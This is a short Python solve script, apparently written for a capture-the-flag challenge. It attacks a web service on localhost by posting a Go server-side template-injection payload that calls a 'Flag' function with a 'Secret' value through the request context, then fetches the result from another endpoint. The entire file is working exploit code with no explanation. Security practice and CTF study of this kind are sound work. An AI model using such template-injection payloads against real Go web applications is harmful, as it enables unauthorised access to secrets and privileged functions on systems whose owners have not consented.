import requests
import time

target = "http://localhost:33201"


s = requests.Session()

s.get(f"{target}/")
s.post(f"{target}/tung", data={
    "Tralalero": "aaa",
    "Tralala": '{{with .Context}}{{with .Value "tung"}}{{call .Flag .Secret}}{{end}}{{end}}'
})
s.post(f"{target}/tung", data={
    "Tralalero": "baa",
    "Tralala": "aaa"
})
time.sleep(1)

print(s.get(f"{target}/sahur").text)